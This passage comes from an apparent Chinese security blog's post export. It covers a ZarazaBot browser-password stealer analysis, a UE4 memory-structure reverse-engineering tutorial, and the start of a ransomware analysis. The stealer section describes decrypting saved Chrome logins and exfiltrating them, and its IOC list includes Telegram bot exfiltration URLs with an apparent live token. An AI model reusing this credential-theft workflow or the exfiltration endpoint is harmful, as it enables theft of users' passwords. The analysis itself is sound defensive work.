src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428104447758.png\" alt=\"image-20230428104447758\"></p>\n<p>通过telegramBot的api将计算机用户名上传。</p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428110324073.png\" alt=\"image-20230428110324073\"></p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428110345719.png\" alt=\"image-20230428110345719\"></p>\n<p>然后尝试枚举计算机中存在的浏览器目录。从网络浏览器中提取登录凭据并将其保存在名为<code>%TEMP%\\output.txt</code>的文件中。</p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428104359866.png\" alt=\"image-20230428104359866\"></p>\n<table>\n<thead>\n<tr>\n<th>360 Browser</th>\n<th>Chromium | SRWare</th>\n<th>Iridium Browser</th>\n<th>Sleipnir 6</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>7Star</td>\n<td>Iron Browser</td>\n<td>Kinza</td>\n<td>Slimjet</td>\n</tr>\n<tr>\n<td>Amigo</td>\n<td>Citrio</td>\n<td>Kometa</td>\n<td>Sputnik</td>\n</tr>\n<tr>\n<td>AVAST Software</td>\n<td>CocCoc</td>\n<td>Liebao Browser</td>\n<td>Torch Browser</td>\n</tr>\n<tr>\n<td>AVG Browser</td>\n<td>Comodo Dragon</td>\n<td><strong>Opera</strong></td>\n<td>uCozMedia</td>\n</tr>\n<tr>\n<td><strong>Brave Browser</strong></td>\n<td>CoolNovo</td>\n<td><strong>Opera GX</strong></td>\n<td>URBrowser</td>\n</tr>\n<tr>\n<td>CCleaner</td>\n<td>Coowon</td>\n<td><strong>Opera Neon</strong></td>\n<td>Vivaldi</td>\n</tr>\n<tr>\n<td>CentBrowser</td>\n<td><strong>Edge Chromium (Microsoft Edge)</strong></td>\n<td>Orbitum</td>\n<td><strong>Yandex</strong></td>\n</tr>\n<tr>\n<td>Chedot</td>\n<td>Elements Browser</td>\n<td>QIP Surf</td>\n<td></td>\n</tr>\n<tr>\n<td><strong>Chrome</strong></td>\n<td>Epic Privacy Browser</td>\n<td>SalamWeb</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>览器使用的 SQLite 数据库格式包含一个名为“Login Data”；它包括一个“logins”数据库表。该表存储各种网站的登录详细信息，并包含如下字段：</p>\n<table>\n<thead>\n<tr>\n<th>文件夹</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>origin_url</td>\n<td>网站的主要链接</td>\n</tr>\n<tr>\n<td>action_url</td>\n<td>站点的登录链接</td>\n</tr>\n<tr>\n<td>username_element</td>\n<td>网站上的用户名字段</td>\n</tr>\n<tr>\n<td>username_value</td>\n<td>用于登录的用户名</td>\n</tr>\n<tr>\n<td>password_element</td>\n<td>网站上的密码字段</td>\n</tr>\n<tr>\n<td>password_value</td>\n<td>用于登录的加密密码</td>\n</tr>\n<tr>\n<td>date_created</td>\n<td>数据存储的日期</td>\n</tr>\n<tr>\n<td>times_used</td>\n<td>密码被使用了多少次</td>\n</tr>\n<tr>\n<td>blacklisted_by_user</td>\n<td>如果永远不应存储密码，则标志设置为 1</td>\n</tr>\n</tbody></table>\n<p>但样本仅检索到三个关键数据库详细信息：<code>origin_url</code>、<code>username_value</code>和<code>password_value</code>。鉴于密码字段以加密格式存储，攻击者必须检查两个特定的内容才能检索密码。</p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428105452368.png\" alt=\"image-20230428105452368\"></p>\n<p>较新的浏览器版本使用 v80 密码签名。从 v10 或 v11 开始，它使用基于主密钥的加密来安全地存储用户的 Web 登录密码。使用WinApi(“CryptProtectData”)进一步保护加密密码。 为了识别加密密钥，在字符串的开头插入签名 DPAPI。然后使用 Base64 对加密密钥进行编码，并保存在位于用户数据文件夹中的本地状态文件中。</p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428105616849.png\" alt=\"image-20230428105616849\"></p>\n<p>然后把窃取到的密码保存到<code>%TEMP%\\output.txt</code>的文件中。</p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428105701159.png\" alt=\"image-20230428105701159\"></p>\n<p>再调用telegramBot的api将<code>ouput.txt</code>文件上传，并以<code>Passwords.txt</code>保存到服务器上。</p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428110036360.png\" alt=\"image-20230428110036360\"></p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428105920551.png\" alt=\"image-20230428105920551\"></p>\n<p>最后将当前屏幕进行截取后保存到<code>%TEMP%\\Screen.jpg</code>中。</p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428110112857.png\" alt=\"image-20230428110112857\"></p>\n<p>同样也上传到到服务器中，保存名为<code>Screen.jpg</code>.</p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428110055541.png\" alt=\"image-20230428110055541\"></p>\n<p>最后删除窃取到的文件。</p>\n<p><img src=\"/../images/Virus/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230428110126486.png\" alt=\"image-20230428110126486\"></p>\n<h1 id=\"三、IOC\"><a href=\"#三、IOC\" class=\"headerlink\" title=\"三、IOC\"></a>三、IOC</h1><p>MD5：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">41d5fda21cf991734793df190ff078ba</span><br></pre></td></tr></table></figure>\n\n<p>URL:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hxxps://api.telegram.org/bot6007402729:AAEPb0k0ec_Eid2gxzweSWuNju-dWhHicS0/sendDocument?chat_id=5881556974</span><br><span class=\"line\">hxxps://api.telegram.org/bot6007402729:AAEPb0k0ec_Eid2gxzweSWuNju-dWhHicS0/sendMessage?chat_id=5881556974</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["Virus"]},{"title":"一、了解UE4引擎及数据查找","url":"/2024/04/21/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/","content":"<h1 id=\"一、了解UE4引擎及数据查找\"><a href=\"#一、了解UE4引擎及数据查找\" class=\"headerlink\" title=\"一、了解UE4引擎及数据查找\"></a>一、了解UE4引擎及数据查找</h1><h1 id=\"一、获取UE4源代码\"><a href=\"#一、获取UE4源代码\" class=\"headerlink\" title=\"一、获取UE4源代码\"></a>一、获取UE4源代码</h1><p>github搜索<code>UnrealEngine</code>，或者打开地址<a href=\"https://github.com/EpicGames/UnrealEngine/branches/all\">https://github.com/EpicGames/UnrealEngine/branches/all</a></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>找到一份你想要的源码后，点击左边版本号，进入对应版本的页面。然后点击下载就行了。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>Tip：UE引擎源码不会公开，需要给EpicGames进行账号关联。<a href=\"https://zhuanlan.zhihu.com/p/107516361\">https://zhuanlan.zhihu.com/p/107516361</a></p>\n<h1 id=\"二、了解UE4引擎名词\"><a href=\"#二、了解UE4引擎名词\" class=\"headerlink\" title=\"二、了解UE4引擎名词\"></a>二、了解UE4引擎名词</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<ul>\n<li><strong>UObject</strong>：引擎对象的最小单位。只有继承了这个类，才会被UE认为是一个对象。</li>\n<li><strong>Actor</strong>：在UE里其实不是某种具象化的3D世界里的对象，而是世界里的种种元素，用更泛化抽象的概念来看，小到一个个地上的石头，大到整个世界的运行规则，其实更像是一个容器。</li>\n<li><strong>RootComponent</strong>：对象的根组件，也就是对象的位置信息。</li>\n<li><strong>ULevel</strong>：UE的场景的划分模式是基于子关卡级来做的，UE4和其它支持大世界的引擎一样支持游戏场景中的物体动态加载和卸载。UE4中动态加载卸载的子关卡叫做流关卡(StreamingLevel ,ULevelStreaming类)，一开始就加载子关卡叫做持久关卡(PersistentLevel)。场景中的具体物件都是放置在关卡或流关卡中。</li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<ul>\n<li><strong>UWorld</strong>：游戏主场景。在游戏过程中，一般只存在一个UWorld实例，类似于总导演。</li>\n<li><strong>GameInstance</strong>：顾名思义，游戏实例。会保存着当前的World和其他整个游戏的信息。官方解释是一个正在运行的游戏的高级别的管理对象，在游戏创建时生成，游戏关闭时销毁，一个游戏中可以有多个GameInstance。在游戏中切换关卡，GameInstance不会销毁（切换关卡时可用GameInstance携带信息）。</li>\n<li><strong>GameMode</strong>：负责制定游戏的规则，也就是应该如何玩游戏，遵守哪些规则。</li>\n<li><strong>GameState</strong>：游戏状态。记录游戏的数据，比如当前游戏的进度，世界任务的完成状态等，会自动同步到各个客户端。</li>\n<li><strong>UEgine</strong>：UE4编辑器本身就是一个游戏。Engine分化出两个子类：UEditorEngine和UGameEngine。UGameEngine用来创建出唯一的一个GameWorld，因为也只有一个，所以为了方便起见，就直接保存了GameInstance指针。EditorWorld其实只是用来预览，所以并不拥有OwningGameInstance，而PlayWorld里的OwningGameInstance才是间接保存了GameInstance。</li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<ul>\n<li><strong>GObject</strong>：记录着UE4所有类对象，比如，玩家类，引擎类，物品类。</li>\n<li><strong>GName</strong>：由于C++没有反射机制，故UE自己实现了反射。其中所有的类、字段等字符串信息都存在GName中。</li>\n</ul>\n<p>参考链接：</p>\n<p><a href=\"https://blog.csdn.net/boonti/article/details/82909884\">https://blog.csdn.net/boonti/article/details/82909884</a></p>\n<p><a href=\"http://www.zeroyx.com/index.php?r=site/art&id=41&title_id=175\">http://www.zeroyx.com/index.php?r=site/art&id=41&title_id&#x3D;175</a></p>\n<p><a href=\"https://blog.csdn.net/qq_33500238/article/details/104555612\">https://blog.csdn.net/qq_33500238&#x2F;article&#x2F;details&#x2F;104555612</a></p>\n<p><a href=\"https://blog.csdn.net/you_lan_hai/article/details/71980058\">https://blog.csdn.net/you_lan_hai&#x2F;article&#x2F;details&#x2F;71980058</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/24005952/\">https://zhuanlan.zhihu.com/p/24005952/</a></p>\n<h1 id=\"三、通过源代码寻找数据\"><a href=\"#三、通过源代码寻找数据\" class=\"headerlink\" title=\"三、通过源代码寻找数据\"></a>三、通过源代码寻找数据</h1><p>首先要确定要找数据的类，然后在类中找有没有一些可用的数据。（单例类之类的）</p>\n<ul>\n<li><strong>GWorld</strong>：<code>SeamlessTravel FlushLevelStreaming</code></li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<ul>\n<li><strong>GName</strong>：<code>ByteProperty</code></li>\n</ul>\n<p>找到UObject，从FName中跳到GetName</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>然后转到FName，查看是哪个函数出的字符串</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>然后转到ToString</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>很明显使用Entry算出来的，那么直接进GetDisplayNameEntry</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>进入GetNamePool</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>查找哪个地方调用了这个函数。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<ul>\n<li><strong>GObject</strong>：<code>UObjectArray</code></li>\n</ul>\n<p>可以看到有GObjectArray</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>点过去看到代码注释提示说这是一个全局变量。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>然后直接找这个名字在哪里用过。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<p>搜索整个字符串，到ID，找到FOR头部。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<p>由于GObjectArray是全局，然后C++编译器直接把GObjectArray的Num成员以地址形式输出。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<p>查看NumElements偏移然后计算即可。</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<ul>\n<li><strong>GameInstance</strong>：InWorld-&gt;GetGameInstance() is null</li>\n</ul>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId31.png\" alt=\"document_image_rId31\"></p>\n<ul>\n<li><p><strong>GEngine</strong>：GenericConnectionFailed</p>\n<p>  <img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId32.png\" alt=\"document_image_rId32\"></p>\n<p>  <img src=\"/../images/UnrealEngine/%E4%B8%80%E3%80%81%E4%BA%86%E8%A7%A3UE4%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E6%9F%A5%E6%89%BE/document_image_rId33.png\" alt=\"document_image_rId33\"></p>\n</li>\n</ul>\n","categories":["UnrealEngine"]},{"title":"一个数据加密恶意样本分析","url":"/2024/04/21/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","content":"<h1 id=\"一个数据加密恶意样本分析\"><a href=\"#一个数据加密恶意样本分析\" class=\"headerlink\" title=\"一个数据加密恶意样本分析\"></a>一个数据加密恶意样本分析</h1><ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2021-12-22 14:23</li>\n</ul>\n<p>该样本为帖子<a href=\"https://bbs.pediy.com/thread-270586.htm\">[讨论]抠下来的，过火绒-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a>看到的，当时闲的没事下载来看了看。样本运行后会对电脑文件加密，并且删除了卷影文件，防止通过磁盘工具恢复。</p>\n<h1 id=\"运行效果以及行为\"><a href=\"#运行效果以及行为\" class=\"headerlink\" title=\"运行效果以及行为\"></a>运行效果以及行为</h1><p>弹出网页</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>隐藏了所有的文件夹，并创建了新的文件夹，实则为快捷方式，右键属性可看到重定向。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>加密了文件，无法打开</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>对文件进行了截断操作，加密。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>手动检查启动项后发现，在启动中添加了一个html，该html为样本弹出的html。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<h1 id=\"样本分析：\"><a href=\"#样本分析：\" class=\"headerlink\" title=\"样本分析：\"></a>样本分析：</h1><table>\n<thead>\n<tr>\n<th>MD5</th>\n<th>8f2050c9937f5f21b118c18dce3054fb</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>SHA1</td>\n<td>0df872ae7916dd70e69b3a319ef57612e0ace739</td>\n</tr>\n<tr>\n<td>SHA256</td>\n<td>32e504c5664ee16d00149c1d8fe8184b872b07f9fad93ed3bce2bf11c1cc7c3a</td>\n</tr>\n</tbody></table>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>突破口：通过VirusTotal和微云沙盒分析的得知可能的操作有分配内存，写内存。在给WriteProcessMemory下断调试观察参数时发现当前区域为动态分配的内存，</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p>故其首先调用了VirtualAlloc,ida进行交叉引用可到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __thiscall <span class=\"title function_\">sub_2001DC0</span><span class=\"params\">(<span class=\"type\">int</span> this, <span class=\"keyword\">struct</span> tagCREATESTRUCTA *a2)</span></span><br></pre></td></tr></table></figure>\n\n<p>该函数内部进行了shellcode初始化及解密后进行调用</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>在dbg里对VirtualAlloc下断后跟踪后可得到解密的内容</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>这里直接对shellcode进行dump。</p>\n<p>因为是从EF0000开始dump，所以拖进ida分析的时候需要修复一下头部，从28开始。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<h1 id=\"ShellCode分析\"><a href=\"#ShellCode分析\" class=\"headerlink\" title=\"ShellCode分析\"></a>ShellCode分析</h1><p>函数进来后会进行初始化字符串。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>然后调用InitProcAddr获取LoadLibrary和GetProcAddress地址。InitProcAddr的实现也是从Ldr中去遍历</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>紧接着分别获取以下这些函数地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">GetModuleFileNameW</span><br><span class=\"line\">CreateFileW</span><br><span class=\"line\">VirtualAlloc</span><br><span class=\"line\">GetFileSize</span><br><span class=\"line\">ReadFile</span><br><span class=\"line\">CloseHandle</span><br><span class=\"line\">SHGetSpecialFolderPathW</span><br><span class=\"line\">CopyFileW</span><br><span class=\"line\">SetFileAttributesW</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>随后获取了AppData和StartUp的路径，其中AppData进行了以下拼接</p>\n<blockquote>\n<p>%AppData%\\CSIDL_<br>%AppData%\\CSIDL_X</p>\n</blockquote>\n<p>然后检查当前运行的实例是否存在于其中一个目录中，如果不存在则自我复制后，将文件设置为隐藏状态（<strong>单独分析shellcode时路径不存在，猜测为主程序创建目录</strong>）</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>中间存在一些对文件读写操作，经过分析后发现是为了给新的shellcode申请空间。</p>\n<p><img 